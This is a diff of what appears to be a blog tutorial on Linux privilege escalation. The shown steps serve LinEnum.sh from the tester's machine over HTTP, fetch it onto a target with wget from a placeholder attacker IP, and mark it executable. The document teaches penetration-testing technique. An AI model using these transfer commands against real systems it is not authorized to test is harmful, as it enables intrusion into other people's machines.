@@ -19,17 +19,25 @@ python3 -m http.server 8000
 
 Once the server is started, you can request the file you want from the target's console :
 
+
+![wget LinEnum](https://github.com/peixetlift/peixetlift.github.io/blob/master/assets/LinuxPrivEsc/wget%20linenum4.png)
+
 ```
 wget <YOUR MACHINE'S @IP>:8000/LinEnum.sh
 ```
+
 >wget is a network downloader
 >By using this command, we are downloading the file LinEnum.sh from the server in <YOUR MACHINE'S @IP> that we started before.
 
-Now that LinEnum.sh is on the target's machine, we need to make it executable, this is done by using :
+
+Now that LinEnum.sh is on the target's machine, we need to make it executable (because we need to run it in order to start the enumeration process), this is done by using :
 
 ```
 chmod +x LinEnum.sh
 ```
+
+To see how Linux file permissions work, you can visit [this page](https://www.redhat.com/sysadmin/manage-permissions) 
+
 
 ### [](#header-3)Header 3
 
